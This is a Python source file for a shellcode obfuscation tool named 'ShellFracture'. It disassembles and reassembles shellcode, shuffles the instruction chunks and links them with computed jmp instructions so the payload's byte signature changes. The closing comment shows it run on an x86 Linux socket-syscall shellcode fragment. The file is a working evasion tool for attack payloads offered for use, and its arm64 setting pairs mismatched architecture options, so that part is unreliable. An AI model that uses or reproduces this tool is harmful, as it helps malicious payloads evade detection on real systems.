from capstone import *
from keystone import *
import argparse
import secrets
import struct

def arginit():
    parser = argparse.ArgumentParser(description="ShellFracture: The one unbeknownst to old eyes...")
    parser.add_argument("--arch", type=str, required=True, help="AMD, ARM")
    parser.add_argument("--mode", type=str, required=True, help="x86, x64, arm, thumb, arm64")
    parser.add_argument("--shellcode", type=str, required=True, help="<Put a C-styled shellcode here>")
    parser.add_argument("--interval", type=int, default=1, help="Amount of Jmps per Nth instruction")
    return parser.parse_args()

def pretty_print(data):
    for index, size, offset, chunk in data:
        print(f"Chunk {index} ; {size} bytes long ; located at {offset=}")
        for item in chunk:
            print(f"  {item}")
        print()

def faster_modulo(instructionLen, interval):
    return instructionLen % interval 

def chunk_list(lst, chunk_size):
    return [ [i // chunk_size, lst[i:i + chunk_size] ] for i in range(0, len(lst), chunk_size)]

def secure_shuffle(lst):
    for i in range(len(lst) - 1, 0, -1):
        j = secrets.randbelow(i + 1)  # random int in [0, i]
        lst[i], lst[j] = lst[j], lst[i]
    return lst

def add_metadata(code):
    patched = []
    offset = 0
    for index, chunk in code[:]:
        total = sum(len(b) for b in chunk[:]) >> 2     # divide by 4 since each 'byte' represents for chars eg. \x90 -> "\\x90"
        patched.append([index, total, offset, chunk])
        offset += total
    return patched

def calculate_padding(instructionLen, interval):
    remainder = faster_modulo(instructionLen, interval)
    insCutOff = (instructionLen - remainder) + interval
    return insCutOff - instructionLen

def shuffle_blocks(code, interval):
    bBlocks = chunk_list(code, interval)
    firstChunk = bBlocks.pop(0)
    bBlocks = secure_shuffle(bBlocks.copy())
    bBlocks.insert(0, firstChunk)
    return bBlocks

def calculate_offset(target_add, jmp_add):
    jmp_size = 5
    return (target_add - (jmp_add + jmp_size))

def insert_jmps(code):
    nop = "\\x90"
    jmp_code = "\\xe9" + ("\\x00"*4)
    for i in range(len(code)):
        code[i][1].append(jmp_code)
    code.append([len(code), [nop]])
    return code

def resolve_jmps(code):
    jump_table = {idx : i for i, (idx, _, _, _) in enumerate(code)}
    max_size = len(jump_table) - 1
    jmp_size = 5
  
    for i, (idx, size, offset, inst) in enumerate(code[:]):
        if(i < max_size):
            nextPos = jump_table[idx + 1]
            target_address = code[nextPos][2]
            jump_address = (offset + size) - jmp_size
            rel32 = calculate_offset(target_address, jump_address)
            packed = struct.pack('<i', rel32)

            jmp_bytes = ("\\xe9" + ''.join(f'\\x{b:02x}' for b in packed))
            code[i][3][-1] = jmp_bytes
            #print(f"{target_address=} and {jump_address=} === RVA: {rel32}")
            #print(f"{idx=} {size=} {inst}")
            #print(f"\t\t\\___next {nextPos} which has an code of {code[nextPos][3]}")
        else:
            pass
            #print(f"FINAL CHUNK LOCATED {idx=} {size=} {inst}\n")
    #print("\n")
    return code

def main():

    args = arginit()

    counter = 0
    TotalSize = 0
    StoreCode = []
    nop = "\\x90"
    architecture = {
        "AMD" : {
            "x86" : (CS_ARCH_X86, CS_MODE_32, KS_ARCH_X86, KS_MODE_32),
            "x64" : (CS_ARCH_X86, CS_MODE_64, KS_ARCH_X86, KS_MODE_64),
        },
        "ARM" : {
            "arm":   (CS_ARCH_ARM, CS_MODE_ARM, KS_ARCH_ARM, KS_MODE_ARM),
            "thumb": (CS_ARCH_ARM, CS_MODE_THUMB),
            "arm64": (CS_ARCH_ARM64, 0, KS_ARCH_ARM, KS_MODE_ARM),
        }
    }

    context = architecture[args.arch.upper()][args.mode.lower()]
    CODE = bytes.fromhex(args.shellcode.replace("x", ""))
    print(f'Shellcode = {CODE}', end='\n\n\n')

    md = Cs(context[0], context[1])
    md.syntax = CS_OPT_SYNTAX_INTEL
    md.detail = True

    if args.arch.upper() == "AMD":
        ks = Ks(context[2], context[3])
    else:
        if(args.mode.lower() != "thumb"):
            ks = Ks(context[2], context[3])
        else:
            print("[-] Unsupported type")
            exit()
    
    for idx, (address, size, mnemonic, op_str) in enumerate(md.disasm_lite(CODE, 0x0000)):
        instruction = f"{mnemonic} {op_str}".strip()
        shc, count = ks.asm(instruction)
        shc = bytes(shc)
        shc = "".join([f"\\x{b:02x}" for b in shc])
        StoreCode.append(shc)

    for i in range(calculate_padding(len(StoreCode), args.interval)):
        StoreCode.append(nop)

    Fractured = shuffle_blocks(StoreCode, args.interval)
    for i in Fractured:
        print(i)
    print("\n\n[*] Inserting jmp code\n\n")
    Fractured = insert_jmps(Fractured)
    Fractured = add_metadata(Fractured)
    pretty_print(Fractured)
    print("\n\n[*] Resolving jumps...\n\n")
    Fractured = resolve_jmps(Fractured)
    pretty_print(Fractured)

    Final = []

    for _, _, _, instruction in Fractured:
        Final.append(instruction)
    Final = ''.join(byte for shards in Final for byte in shards)
    print(f'"{Final}"')

if __name__ == "__main__":
    main()

'''
python3 skyfracture.py --arch amd --mode x86 --interval 4 --shellcode \x5B\x5E\x52\x68\x02\x00\xBF\xBF\x6A\x10\x51\x50\x89\xE1\x6A\x66\x58\xCD\x80

0:  5b                      pop    ebx
1:  5e                      pop    esi
2:  52                      push   edx
3:  68 02 00 bf bf          push   0xbfbf0002
8:  6a 10                   push   0x10
a:  51                      push   ecx
b:  50                      push   eax
c:  89 e1                   mov    ecx,esp
e:  6a 66                   push   0x66
10: 58                      pop    eax
11: cd 80                   int    0x80
'''
